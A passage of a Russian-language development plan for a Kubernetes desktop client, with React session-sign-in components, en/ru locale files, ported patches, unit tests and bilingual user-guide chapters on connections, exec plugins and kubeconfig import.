              {t("cluster.connection.apiGroups")}
              <Hint k="hints.cluster.apiGroups" label={t("cluster.connection.apiGroups")} />
            </span>
          </dt>
          <dd>{found.length > 0 ? found.join(", ") : "—"}</dd>
        </div>
      </dl>
      <h3>{t("cluster.connection.capabilities")}</h3>
      <ul className="steps">
        {CAPABILITIES.filter((c) => openShift || !OPENSHIFT_ONLY.includes(c)).map((c) => (
          <li key={c}>
            {info.capabilities[c] ? "✅" : "—"} {t(`cluster.capability.${c}`)}
          </li>
        ))}
      </ul>
      {info.groups.length > 0 && (
        <details>
          <summary>{t("cluster.connection.groups", { count: info.groups.length })}</summary>
          <ul>
            {info.groups.map((g) => (
              <li key={g}>
                <code>{g}</code>
              </li>
            ))}
          </ul>
        </details>
      )}
    </>
  );
}
````

<!-- block: file t15-src-components-cluster-sessionactions-tsx step=15.3 path=src/components/cluster/SessionActions.tsx -->
````tsx
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { openUrl } from "@tauri-apps/plugin-opener";
import { useState } from "react";
import { useTranslation } from "react-i18next";
import { api } from "../../api/client";
import type { ConnectionProfile } from "../../api/types";
import { useWorkspace } from "../../state/workspace";
import { ErrorBanner } from "../common/ErrorBanner";

/**
 * Что сделать, если сессия истекла или токена нет: войти через браузер, вставить токен
 * (в том числе со страницы токена кластера), запустить exec-плагин снова или изменить
 * подключение (сертификат, строка запуска exec-плагина).
 */
export function SessionActions({ profile }: { profile: ConnectionProfile }) {
  const { t } = useTranslation();
  const queryClient = useQueryClient();
  const open = useWorkspace((s) => s.open);
  const [token, setToken] = useState("");
  const id = profile.id;
  const done = (info: unknown) => queryClient.setQueryData(["connection", id], info);

  const login = useMutation({ mutationFn: () => api.startOauthLogin(id), onSuccess: done });
  // Exec-плагин: подключение заново запускает его снова.
  const rerun = useMutation({ mutationFn: () => api.connect(id, true), onSuccess: done });
  const paste = useMutation({
    mutationFn: async () => {
      await api.setConnectionToken(id, token);
      return api.connect(id, true);
    },
    onSuccess: (info) => {
      setToken("");
      done(info);
    },
  });
  const tokenPage = useMutation({
    mutationFn: async () => {
      await openUrl(await api.oauthTokenPage(id));
    },
  });

  if (profile.auth.method === "clientCert")
    return (
      <div className="toolbar">
        <button type="button" onClick={() => open({ kind: "connection-form", connectionId: id })}>
          {t("cluster.session.editConnection")}
        </button>
      </div>
    );

  if (profile.auth.method === "exec")
    return (
      <div className="panel">
        <div className="toolbar">
          {rerun.isPending ? (
            <>
              <span className="muted">{t("cluster.session.waitingExec")}</span>
              <button type="button" onClick={() => void api.cancelOauthLogin(id)}>
                {t("cluster.session.cancelLogin")}
              </button>
            </>
          ) : (
            <button type="button" className="primary" onClick={() => rerun.mutate()}>
              {t("cluster.session.loginExec")}
            </button>
          )}
          <button type="button" onClick={() => open({ kind: "connection-form", connectionId: id })}>
            {t("cluster.session.editConnection")}
          </button>
        </div>
        {rerun.error && <ErrorBanner error={rerun.error} />}
      </div>
    );

  return (
    <div className="panel">
      {profile.auth.method === "browser" && (
        <div className="toolbar">
          {login.isPending ? (
            <>
              <span className="muted">{t("cluster.session.waitingBrowser")}</span>
              <button type="button" onClick={() => void api.cancelOauthLogin(id)}>
                {t("cluster.session.cancelLogin")}
              </button>
            </>
          ) : (
            <button type="button" className="primary" onClick={() => login.mutate()}>
              {t("cluster.session.loginBrowser")}
            </button>
          )}
        </div>
      )}
      {login.error && <ErrorBanner error={login.error} />}
      <div className="toolbar">
        <label htmlFor={`token-${id}`}>{t("cluster.session.pasteToken")}</label>
        <input
          id={`token-${id}`}
          type="password"
          autoComplete="off"
          placeholder="sha256~…"
          value={token}
          onChange={(e) => setToken(e.target.value)}
        />
        <button type="button" disabled={!token.trim() || paste.isPending} onClick={() => paste.mutate()}>
          {t("cluster.session.saveToken")}
        </button>
        <button type="button" className="link" disabled={tokenPage.isPending} onClick={() => tokenPage.mutate()}>
          {t("cluster.session.tokenPage")}
        </button>
      </div>
      {paste.error && <ErrorBanner error={paste.error} />}
      {tokenPage.error && <ErrorBanner error={tokenPage.error} />}
    </div>
  );
}
````

<!-- block: locales t15-locales step=15.3 -->
````json
{
  "en": {
    "cluster": {
      "connection": {
        "connecting": "Connecting…",
        "reconnect": "Reconnect",
        "edit": "Edit connection",
        "user": "Signed in as",
        "platform": "Platform",
        "version": "Kubernetes version",
        "apiGroups": "Found in the cluster",
        "capabilities": "What you can read at the cluster level",
        "groups_one": "{{count}} group",
        "groups_other": "{{count}} groups"
      },
      "capability": {
        "listProjects": "List of projects",
        "listNodes": "Nodes",
        "listAllPods": "Pods in all projects",
        "readClusterOperators": "Cluster operators",
        "readClusterVersion": "Cluster version and updates"
      },
      "session": {
        "title": "Sign in again",
        "loginBrowser": "Sign in via browser",
        "waitingBrowser": "Waiting for sign-in in the browser…",
        "cancelLogin": "Cancel",
        "loginExec": "Run the exec plugin again",
        "waitingExec": "Waiting for the exec plugin… If it opened the browser, finish signing in there.",
        "pasteToken": "Token",
        "saveToken": "Save token",
        "tokenPage": "Get a token on the cluster page",
        "editConnection": "Edit connection"
      }
    },
    "hints": {
      "cluster": {
        "platform": "Detected from the API groups and the version: OpenShift, or Kubernetes with its distribution (EKS, GKE, AKS, Rancher, Deckhouse, k3s, RKE2).",
        "apiGroups": "What the cluster offers beyond plain Kubernetes: Route, projects and DeploymentConfig (OpenShift), Gateway API. They decide which objects are shown."
      }
    }
  },
  "ru": {
    "cluster": {
      "connection": {
        "connecting": "Подключение…",
        "reconnect": "Подключиться заново",
        "edit": "Изменить подключение",
        "user": "Вход выполнен как",
        "platform": "Платформа",
        "version": "Версия Kubernetes",
        "apiGroups": "Найдено в кластере",
        "capabilities": "Что вам доступно на уровне кластера",
        "groups_one": "{{count}} группа",
        "groups_few": "{{count}} группы",
        "groups_many": "{{count}} групп",
        "groups_other": "{{count}} группы"
      },
      "capability": {
        "listProjects": "Список проектов",
        "listNodes": "Ноды",
        "listAllPods": "Поды во всех проектах",
        "readClusterOperators": "Операторы кластера",
        "readClusterVersion": "Версия кластера и обновления"
      },
      "session": {
        "title": "Войдите снова",
        "loginBrowser": "Войти через браузер",
        "waitingBrowser": "Ожидание входа в браузере…",
        "cancelLogin": "Отменить",
        "loginExec": "Запустить exec-плагин снова",
        "waitingExec": "Ожидание exec-плагина… Если он открыл браузер, завершите вход там.",
        "pasteToken": "Токен",
        "saveToken": "Сохранить токен",
        "tokenPage": "Получить токен на странице кластера",
        "editConnection": "Изменить подключение"
      }
    },
    "hints": {
      "cluster": {
        "platform": "Определяется по группам API и версии: OpenShift или Kubernetes с дистрибутивом (EKS, GKE, AKS, Rancher, Deckhouse, k3s, RKE2).",
        "apiGroups": "Что есть в кластере сверх обычного Kubernetes: Route, проекты и DeploymentConfig (OpenShift), Gateway API. От этого зависит, какие объекты показываются."
      }
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 15.3`.

- [ ] **Step 4: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 17 passed`, `Tests 76 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): вкладка подключения — пользователь, платформа и группы API, права, вход заново, токен и exec-плагин" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 16: Настройки языка, встроенная справка, «О программе»

**Files:**
- Port: `scripts/guide-publish.d.mts`, `scripts/guide-publish.mjs` (с правками), `scripts/guide-publish.test.mjs` (с правками), `src/components/help/HelpPanel.test.tsx`, `src/components/help/HelpPanel.tsx`, `src/components/settings/SettingsPanel.tsx` (с правками), `src/guide/chapters.test.ts`, `src/guide/chapters.ts` (с правками), `src/guide/parse.test.ts` (с правками), `src/guide/parse.ts`, `src/state/helpContext.ts`
- Create: `docs/guide/en/connections.md`, `docs/guide/en/getting-started.md`, `docs/guide/ru/connections.md`, `docs/guide/ru/getting-started.md`, `src-tauri/src/commands/app.rs`, `src/components/about/AboutPanel.test.tsx`, `src/components/about/AboutPanel.tsx`, `src/components/help/helpChapterFor.test.ts`, `src/components/help/helpChapterFor.ts`, `src/components/settings/SettingsPanel.test.tsx`
- Modify: `PORTED.md`, `package.json`, `scripts/i18n-check.mjs`, `src-tauri/src/commands/mod.rs`, `src-tauri/src/lib.rs`, `src/locales/en.json`, `src/locales/ru.json`
- Delete: `docs/guide/en/.gitkeep`, `docs/guide/ru/.gitkeep`

**Interfaces:**
- Consumes: задачи 13–15.
- Produces: команда `get_app_info` (`AppInfo { name, version, commit, os, arch, data_dir, log_dir }`); `GUIDE_CHAPTERS = ["getting-started", "connections"]`, `helpChapterFor(tab)` (форма и вкладка подключения → `connections`, остальное → `getting-started`); `SettingsPanel`, `HelpPanel({ spec })`, `AboutPanel`, `useHelpChapter(tabId, chapter)`.

Переносятся «Настройки» (без раздела MCP — он в O2), справка (`HelpPanel`, разбор глав, поиск, F1), `scripts/guide-publish.mjs`. Главы O1a — «Начало работы» и «Подключения» на en и ru: способы входа (браузер — только OpenShift), exec-плагины (список разрешённых, «Найти», подтверждение строки запуска, ожидание и отмена, политика), импорт kubeconfig, платформа, адрес API с путём. Список глав — `GUIDE_CHAPTERS` в `src/guide/chapters.ts` и в `i18n-check.mjs`. «О программе» — без обновлений и архива диагностики (они в O6), с оговоркой о товарных знаках. Команда `get_app_info` — версия, коммит сборки, ОС, каталоги данных и логов.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t16-port step=16.1 -->
````bash
scripts/port.sh scripts/guide-publish.d.mts scripts/guide-publish.d.mts
scripts/port.sh scripts/guide-publish.mjs scripts/guide-publish.mjs
scripts/port.sh scripts/guide-publish.test.mjs scripts/guide-publish.test.mjs
scripts/port.sh src/components/help/HelpPanel.test.tsx src/components/help/HelpPanel.test.tsx
scripts/port.sh src/components/help/HelpPanel.tsx src/components/help/HelpPanel.tsx
scripts/port.sh src/components/settings/SettingsPanel.tsx src/components/settings/SettingsPanel.tsx
scripts/port.sh src/guide/chapters.test.ts src/guide/chapters.test.ts
scripts/port.sh src/guide/chapters.ts src/guide/chapters.ts
scripts/port.sh src/guide/parse.test.ts src/guide/parse.test.ts
scripts/port.sh src/guide/parse.ts src/guide/parse.ts
scripts/port.sh src/state/helpContext.ts src/state/helpContext.ts
````

<!-- block: patch t16-port-scripts-guide-publish-mjs step=16.1 -->
````diff
diff --git a/scripts/guide-publish.mjs b/scripts/guide-publish.mjs
--- a/scripts/guide-publish.mjs
+++ b/scripts/guide-publish.mjs
@@ -79,7 +79,7 @@ export function publishGuide(root, outDir, chapters = GUIDE_CHAPTERS) {
     toc.push({ code, nativeName, items });
   }
   const readme = [
-    "# Glafira for Apache Kafka — User guide",
+    "# Glafira for Kubernetes — User guide",
     "",
     toc.map(({ code, nativeName }) => `[${nativeName}](${code}/getting-started.md)`).join(" · "),
     "",
````

<!-- block: patch t16-port-scripts-guide-publish-test-mjs step=16.1 -->
````diff
diff --git a/scripts/guide-publish.test.mjs b/scripts/guide-publish.test.mjs
--- a/scripts/guide-publish.test.mjs
+++ b/scripts/guide-publish.test.mjs
@@ -112,10 +112,10 @@ test("publishGuide на реальном репозитории: главы бе
   try {
     publishGuide(process.cwd(), out);
     const readme = readFileSync(join(out, "README.md"), "utf8");
-    for (const n of ["English", "Русский", "Deutsch", "Français", "Español", "Italiano", "Polski", "Português (Brasil)"]) {
+    for (const n of ["English", "Русский"]) {
       assert.ok(readme.includes(n), n);
     }
-    for (const c of ["en", "ru", "de", "fr", "es", "it", "pl", "pt-BR"]) {
+    for (const c of ["en", "ru"]) {
       const files = readdirSync(join(out, c));
       assert.equal(files.length, GUIDE_CHAPTERS.length, c);
       for (const f of files) {
````

<!-- block: patch t16-port-src-components-settings-settingspanel-tsx step=16.1 -->
````diff
diff --git a/src/components/settings/SettingsPanel.tsx b/src/components/settings/SettingsPanel.tsx
--- a/src/components/settings/SettingsPanel.tsx
+++ b/src/components/settings/SettingsPanel.tsx
@@ -1,5 +1,4 @@
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
-import { useState } from "react";
 import { useTranslation } from "react-i18next";
 import { api } from "../../api/client";
 import { LANGUAGES } from "../../i18n/languages";
@@ -7,7 +6,6 @@ import { i18n, setLanguage } from "../../i18n";
 import { useHelpChapter } from "../../state/helpContext";
 import { tabId } from "../../state/workspace";
 import { ErrorBanner } from "../common/ErrorBanner";
-import { McpSection } from "./McpSection";
 
 export function SettingsPanel() {
   const { t } = useTranslation();
@@ -21,9 +19,8 @@ export function SettingsPanel() {
     },
   });
 
-  // F1: в разделе MCP — глава «LLM-ассистенты», в остальных — «Начало работы» (язык описан там).
-  const [mcpFocused, setMcpFocused] = useState(false);
-  useHelpChapter(tabId({ kind: "settings" }), mcpFocused ? "llm-mcp" : "getting-started");
+  // F1: глава «Начало работы» (язык описан там).
+  useHelpChapter(tabId({ kind: "settings" }), "getting-started");
 
   if (lang.error) return <ErrorBanner error={lang.error} onRetry={() => lang.refetch()} />;
   const s = lang.data;
@@ -40,7 +37,7 @@ export function SettingsPanel() {
       <div className="toolbar">
         <h2>{t("settings.title")}</h2>
       </div>
-      <section onFocusCapture={() => setMcpFocused(false)}>
+      <section>
         <h3>{t("settings.language.section")}</h3>
         <div className="field">
           <label htmlFor="settings-language">{t("settings.language.label")}</label>
@@ -64,9 +61,6 @@ export function SettingsPanel() {
         {byPolicy && <p className="hint">{t("settings.language.policy")}</p>}
         {change.error && <ErrorBanner error={change.error} />}
       </section>
-      <div onFocusCapture={() => setMcpFocused(true)}>
-        <McpSection />
-      </div>
     </div>
   );
 }
````

<!-- block: patch t16-port-src-guide-chapters-ts step=16.1 -->
````diff
diff --git a/src/guide/chapters.ts b/src/guide/chapters.ts
--- a/src/guide/chapters.ts
+++ b/src/guide/chapters.ts
@@ -1,16 +1,5 @@
-export const GUIDE_CHAPTERS = [
-  "getting-started",
-  "connections",
-  "topics",
-  "browse",
-  "producer",
-  "groups",
-  "consumer-sessions",
-  "health-check",
-  "llm-mcp",
-  "updates",
-  "troubleshooting",
-] as const;
+/** Главы руководства (спец. §16); каждый этап добавляет свои. Тот же список — в `scripts/i18n-check.mjs`. */
+export const GUIDE_CHAPTERS = ["getting-started", "connections"] as const;
 
 export type ChapterId = (typeof GUIDE_CHAPTERS)[number];
 
````

<!-- block: patch t16-port-src-guide-parse-test-ts step=16.1 -->
````diff
diff --git a/src/guide/parse.test.ts b/src/guide/parse.test.ts
--- a/src/guide/parse.test.ts
+++ b/src/guide/parse.test.ts
@@ -49,7 +49,7 @@ describe("parseChapter", () => {
 
   it("escapes markdown in label values", () => {
     const tricky = () => "<code>x</code> [a](b) *z* \\ # | ~ ! _u_";
-    const ch = parseChapter("topics", "# T [[ui:k]]\n\nСм. [[ui:k]].\n", tricky);
+    const ch = parseChapter("getting-started", "# T [[ui:k]]\n\nСм. [[ui:k]].\n", tricky);
     expect(ch.title).toBe("T <code>x</code> [a](b) *z* \\ # | ~ ! _u_");
     expect(ch.sections[0].markdown).toBe(
       "См. **\\<code\\>x\\</code\\> \\[a\\](b) \\*z\\* \\\\ \\# \\| \\~ \\! \\_u\\_**.",
@@ -61,7 +61,7 @@ describe("parseChapter", () => {
   it("drops the period after a label whose value already ends with '.' or ':'", () => {
     const values: Record<string, string> = { dot: "Read-only.", colon: "Logs:", plain: "Help", ell: "Import…" };
     const ch = parseChapter(
-      "topics",
+      "getting-started",
       "# T\n\nA [[ui:dot]]. B [[ui:colon]]. C [[ui:plain]]. D [[ui:ell]]. E [[ui:dot]], [[ui:dot]].x\n",
       (k) => values[k],
     );
@@ -80,7 +80,7 @@ describe("parseChapter", () => {
     const render = (md: string) => renderToStaticMarkup(createElement(Markdown, { skipHtml: true }, md));
     const values: Record<string, string> = { "sidebar.settings": "设置", "a.b": "削除" };
     const src = "# 标题\n\n文本[[ui:sidebar.settings]]文本\n\nトピックを[[ui:a.b]]します。\n";
-    const ch = parseChapter("topics", src, (k) => values[k]);
+    const ch = parseChapter("getting-started", src, (k) => values[k]);
     expect(ch.sections[0].markdown).toBe("文本**设置**文本\n\nトピックを**削除**します。");
     expect(render(ch.sections[0].markdown)).toBe("<p>文本<strong>设置</strong>文本</p>\n<p>トピックを<strong>削除</strong>します。</p>");
     const published = publishChapter(src, new Map(Object.entries(values)));
@@ -89,12 +89,12 @@ describe("parseChapter", () => {
   });
 
   it("keeps a heading without an anchor as a titled section", () => {
-    const ch = parseChapter("topics", "# T\n\n## Без якоря\n\nТекст\n", label);
+    const ch = parseChapter("getting-started", "# T\n\n## Без якоря\n\nТекст\n", label);
     expect(ch.sections).toEqual([{ id: null, title: "Без якоря", markdown: "Текст", heading: true }]);
   });
 
   it("omits an empty intro", () => {
-    const ch = parseChapter("topics", "# Топики\n\n## Список {#list}\n\nТекст\n", label);
+    const ch = parseChapter("getting-started", "# Топики\n\n## Список {#list}\n\nТекст\n", label);
     expect(ch.sections.map((s) => s.id)).toEqual(["list"]);
   });
 });
````

Применить: `python3 /tmp/o1a-blocks.py step 16.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t16-src-components-about-aboutpanel-test-tsx step=16.2 path=src/components/about/AboutPanel.test.tsx -->
````tsx
import { screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithClient } from "../../test/render";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));
vi.mock("../../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../../api/client")>();
  return { ...orig, api: { getAppInfo: vi.fn(), getPolicyStatus: vi.fn() } };
});

import { openUrl } from "@tauri-apps/plugin-opener";
import { api } from "../../api/client";
import { LICENSE_URL, SUPPORT_URL } from "../../lib/links";
import { AboutPanel } from "./AboutPanel";

beforeEach(() => {
  vi.clearAllMocks();
  vi.mocked(api.getAppInfo).mockResolvedValue({
    name: "Glafira for Kubernetes", version: "0.1.0", commit: "abc1234", os: "macos", arch: "aarch64",
    dataDir: "/data", logDir: "/logs",
  });
  vi.mocked(api.getPolicyStatus).mockResolvedValue({
    managed: true, source: "/etc/x", updatesEnabled: true, updateUrl: null, language: null, mcpEnabled: true,
    allowInsecureTls: false,
    allowExecAuth: false,
    errors: [{ key: "errors.policy.invalidBool", params: { key: "mcpEnabled", value: "2" }, text: "x" }],
  });
});

describe("AboutPanel", () => {
  it("версия, сборка, политика, ссылки и товарные знаки", async () => {
    const user = userEvent.setup();
    renderWithClient(<AboutPanel />);
    expect(await screen.findByText("Glafira for Kubernetes")).toBeInTheDocument();
    expect(screen.getByText("0.1.0")).toBeInTheDocument();
    expect(screen.getByText("abc1234")).toBeInTheDocument();
    expect(await screen.findByText("задана")).toBeInTheDocument();
    expect(screen.getByText("Политика организации: mcpEnabled: недопустимое логическое 2")).toBeInTheDocument();
    expect(screen.getByText(/Kubernetes — зарегистрированный товарный знак/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Apache 2.0" }));
    expect(openUrl).toHaveBeenCalledWith(LICENSE_URL);
    await user.click(screen.getByRole("button", { name: "Поддержать проект" }));
    expect(openUrl).toHaveBeenCalledWith(SUPPORT_URL);
  });
});
````

<!-- block: file t16-src-components-help-helpchapterfor-test-ts step=16.2 path=src/components/help/helpChapterFor.test.ts -->
````ts
import { describe, expect, it } from "vitest";
import type { TabSpec } from "../../state/workspace";
import { helpChapterFor } from "./helpChapterFor";

const cases: [TabSpec | null, string][] = [
  [{ kind: "connection-form", connectionId: null }, "connections"],
  [{ kind: "cluster", connectionId: "c" }, "connections"],
  [{ kind: "about" }, "getting-started"],
  [{ kind: "settings" }, "getting-started"],
  [{ kind: "help", chapter: "connections" }, "getting-started"],
  [null, "getting-started"],
];

describe("helpChapterFor", () => {
  it.each(cases)("%j → %s", (tab, chapter) => {
    expect(helpChapterFor(tab)).toBe(chapter);
  });
});
````

<!-- block: file t16-src-components-settings-settingspanel-test-tsx step=16.2 path=src/components/settings/SettingsPanel.test.tsx -->
````tsx
import { act, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { LanguageSettings } from "../../api/types";
import { i18n } from "../../i18n";
import { renderWithClient } from "../../test/render";
import { useHelpContext } from "../../state/helpContext";

const base: LanguageSettings = {
  system: "ru-RU", systemMatch: "ru", chosen: null, policy: null, effective: "ru", reason: "system",
  languages: ["en", "ru"],
};

vi.mock("../../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../../api/client")>();
  return { ...orig, api: { getLanguageSettings: vi.fn(), setLanguage: vi.fn() } };
});

import { api } from "../../api/client";
import { SettingsPanel } from "./SettingsPanel";

beforeEach(() => {
  vi.clearAllMocks();
});

// Выбор «en» переключает глобальный язык; сброс — в act, пока компоненты смонтированы.
afterEach(() => act(() => i18n.changeLanguage("ru")));

describe("SettingsPanel", () => {
  it("показывает язык системы и меняет язык", async () => {
    vi.mocked(api.getLanguageSettings).mockResolvedValue(base);
    vi.mocked(api.setLanguage).mockResolvedValue({ ...base, chosen: "en", effective: "en", reason: "user" });
    const user = userEvent.setup();
    renderWithClient(<SettingsPanel />);
    const select = await screen.findByLabelText("Язык интерфейса");
    expect(screen.getByRole("option", { name: "Как в системе (Русский)" })).toBeInTheDocument();
    expect(screen.getAllByRole("option").map((o) => o.textContent)).toEqual(
      expect.arrayContaining(["English", "Русский"]),
    );
    await user.selectOptions(select, "en");
    expect(api.setLanguage).toHaveBeenCalledWith("en");
    expect(await screen.findByLabelText("Interface language")).toBeInTheDocument();
  });

  it("язык из политики нельзя сменить", async () => {
    vi.mocked(api.getLanguageSettings).mockResolvedValue({ ...base, policy: "ru", reason: "policy" });
    renderWithClient(<SettingsPanel />);
    expect(await screen.findByLabelText("Язык интерфейса")).toBeDisabled();
    expect(screen.getByText("Язык задан вашей организацией")).toBeInTheDocument();
  });

  it("F1 в настройках — глава «Начало работы»", async () => {
    vi.mocked(api.getLanguageSettings).mockResolvedValue(base);
    renderWithClient(<SettingsPanel />);
    await screen.findByLabelText("Язык интерфейса");
    expect(useHelpContext.getState().byTab.settings).toBe("getting-started");
  });
});
````

Применить: `python3 /tmp/o1a-blocks.py step 16.2`.

- [ ] **Step 3: Увидеть падение.**

Run: `pnpm vitest run src/components/about/AboutPanel.test.tsx src/components/help/helpChapterFor.test.ts src/components/settings/SettingsPanel.test.tsx`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 4: Реализация.**

<!-- block: file t16-docs-guide-en-connections-md step=16.4 path=docs/guide/en/connections.md -->
````markdown
# Connections

A connection is the API server address, the sign-in method and the TLS settings of one cluster. Passwords, tokens
and keys are kept in the system secret store (Keychain, Credential Manager, Secret Service), never in files.

## API server address {#api-url}

Use the address of the API server, as in `oc login` or the `server` of a kubeconfig cluster:
`https://api.<cluster>:6443`. A path is allowed, for example the Rancher proxy
`https://rancher.example.com/k8s/clusters/c-xxxxx`. The web console address
(`https://console-openshift-console.apps…`) does not work here. Only `https://` addresses are accepted.

## Sign-in methods {#sign-in}

- **Browser** — like `oc login --web`: Glafira opens the OpenShift sign-in page in your browser and receives the token
  after you sign in. Use [[ui:cluster.session.loginBrowser]] on the connection tab. This works only on OpenShift: other
  clusters have no OpenShift OAuth server, and the sign-in fails with a hint.
- **Token** — paste the output of `oc whoami -t` or a service account token.
- **Client certificate** — a certificate and a key in PEM format, for example from the installer kubeconfig.
- **Exec plugin** — a command that issues credentials, as in kubeconfig: `aws eks get-token`, `aws-iam-authenticator`,
  `gke-gcloud-auth-plugin`, `kubelogin get-token`, `kubectl oidc-login get-token`, `oc get-token`,
  `yc k8s create-token`, `rancher token`. Other commands are not run.

OpenShift tokens usually expire after 24 hours. When the session expires, the connection tab offers to sign in again
or to paste a new token. If sign-in via browser is not available on the cluster, use
[[ui:cluster.session.tokenPage]]: it opens the token page of the cluster; copy the token from it and paste it.

## Exec plugins {#exec}

Glafira runs the plugin by its full path, without a shell. An app started from the Dock does not see the `PATH` of
your terminal, so enter the command name and click [[ui:connections.form.exec.find]]: Glafira looks in the `PATH` of
your login shell and in the standard folders (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin`).

The form shows the exact launch line: the path, the arguments and the environment variables; values of variables that
look like secrets are hidden. Glafira runs the line only after you tick [[ui:connections.form.exec.confirm]]. Any
change to the line, and a connection imported from a file, needs a new confirmation.

Plugins that open the browser (`kubectl oidc-login`, `kubelogin`) work: Glafira waits up to 5 minutes, and the
connection tab can cancel the wait. Plugins that need a terminal (`interactiveMode: Always`, device code sign-in) are
not supported. The credentials are kept in memory until they expire; then the plugin runs again
([[ui:cluster.session.loginExec]]). Your organization may forbid exec plugins.

## Import from kubeconfig {#kubeconfig}

[[ui:sidebar.importKubeconfig]] reads `~/.kube/config` (or the first file from `KUBECONFIG`) and lists its contexts.
Choose the contexts to import: tokens and keys go to the secret store, CA certificates and the project of the
context are copied into the connection. Glafira does not keep a link to the file. For an exec plugin the dialog shows
the launch line with the full path to the command; tick the permission under the line to import it confirmed.
Commands outside the allowed list and `auth-provider` contexts are not supported: the preview explains why.

## Platform {#platform}

[[ui:cluster.connection.platform]] is detected on connection: a cluster with the `config.openshift.io` API group is
OpenShift (OCP or OKD), any other is Kubernetes, with the distribution if Glafira recognizes it (EKS, GKE, AKS,
Rancher, Deckhouse, k3s, RKE2). Platform V DropApp works as Kubernetes for now. What Glafira shows depends on the API
groups, not on the platform: Route, projects and Gateway API appear wherever the cluster has them.

## Certificates and proxy {#tls}

[[ui:connections.form.ca]]: the system certificate store, or only the listed certificates (as `certificate-authority`
in kubeconfig). The mode without certificate verification is insecure; your organization may forbid it.
[[ui:connections.form.proxy]]: the system proxy (`HTTPS_PROXY` and `NO_PROXY`), no proxy, or an explicit address.

## Rights {#rights}

Glafira works with your rights only. On connection it checks what you may read at the cluster level (projects, nodes,
operators). If the cluster does not let you list projects, enter them in
[[ui:connections.form.manualNamespaces]].

## Environments and read-only {#environments}

[[ui:connections.form.environment]] sets the color of the connection. A new `prod` connection is
[[ui:common.readOnly]]: Glafira will not change anything in the cluster through it.

## Folders, export and import {#folders}

Connections can be arranged in nested folders: [[ui:sidebar.newFolder]], drag and drop. [[ui:sidebar.exportAll]]
saves the tree to a file without tokens and keys; [[ui:sidebar.import]] adds connections from such a file with a
preview.
````

<!-- block: file t16-docs-guide-en-getting-started-md step=16.4 path=docs/guide/en/getting-started.md -->
````markdown
# Getting started

Glafira for Kubernetes is a desktop app for working with Kubernetes clusters and diagnosing them, with OpenShift and
Platform V DropApp in focus. It connects with your own credentials and shows only what your rights allow. Nothing in
the cluster changes until you confirm it.

## Installation {#install}

Installers for macOS (`.dmg`), Windows (`.msi`) and Linux (`.deb`, `.rpm`, `.AppImage`) are published at
https://github.com/vvnovg/glafira-kubernetes-releases/releases. Your organization may configure the app with a policy:
some settings are then set by the administrator.

## First connection {#first-connection}

1. Click [[ui:sidebar.newConnection]] in the left panel. If you already use `oc` or `kubectl`, choose
   [[ui:sidebar.importKubeconfig]] instead: the contexts from your kubeconfig become connections.
2. Enter [[ui:connections.form.apiUrl]] — the address you pass to `oc login` or the `server` of a kubeconfig cluster,
   usually `https://api.<cluster>:6443`.
3. Choose [[ui:connections.form.authMethod]]: browser (OpenShift), token, client certificate or exec plugin. See
   [Sign-in methods](connections.md#sign-in).
4. Click [[ui:connections.form.test]]: Glafira checks the address, TLS, sign-in, platform and projects step by step and
   shows which step failed. Then click [[ui:common.save]].
5. The connection tab opens: it shows who you are signed in as, the platform, the Kubernetes version and what you can
   read at the cluster level.

## Interface language {#language}

Open [[ui:sidebar.settings]] and choose [[ui:settings.language.label]]. By default the app follows the system language.
If the language is set by your organization, the list is not available.

## Help {#help}

Press F1 on any screen to open the chapter about it. The guide works offline; use the search field at the top of
the contents.
````

<!-- block: file t16-docs-guide-ru-connections-md step=16.4 path=docs/guide/ru/connections.md -->
````markdown
# Подключения

Подключение — это адрес API-сервера, способ входа и настройки TLS одного кластера. Пароли, токены и ключи хранятся
в системном хранилище секретов (Keychain, Credential Manager, Secret Service), а не в файлах.

## Адрес API-сервера {#api-url}

Укажите адрес API-сервера, как в `oc login` или в `server` кластера в kubeconfig: `https://api.<кластер>:6443`.
Допускается путь — например, прокси Rancher `https://rancher.example.com/k8s/clusters/c-xxxxx`. Адрес веб-консоли
(`https://console-openshift-console.apps…`) здесь не подходит. Принимаются только адреса `https://`.

## Способы входа {#sign-in}

- **Браузер** — как `oc login --web`: Glafira открывает страницу входа OpenShift в браузере и получает токен после
  входа. Кнопка [[ui:cluster.session.loginBrowser]] — на вкладке подключения. Работает только на OpenShift: у других
  кластеров нет OAuth-сервера OpenShift, и вход завершится ошибкой с подсказкой.
- **Токен** — вставьте вывод `oc whoami -t` или токен сервисной учётной записи.
- **Клиентский сертификат** — сертификат и ключ в формате PEM, например из kubeconfig установщика.
- **Exec-плагин** — команда, которая выдаёт учётные данные, как в kubeconfig: `aws eks get-token`,
  `aws-iam-authenticator`, `gke-gcloud-auth-plugin`, `kubelogin get-token`, `kubectl oidc-login get-token`,
  `oc get-token`, `yc k8s create-token`, `rancher token`. Другие команды не запускаются.

Токены OpenShift обычно истекают через 24 часа. Когда сессия истекла, вкладка подключения предложит войти снова или
вставить новый токен. Если вход через браузер на кластере недоступен, нажмите [[ui:cluster.session.tokenPage]]:
откроется страница токена кластера; скопируйте токен оттуда и вставьте.

## Exec-плагины {#exec}

Glafira запускает плагин по полному пути, без оболочки. Приложение, запущенное из Dock, не видит `PATH` терминала,
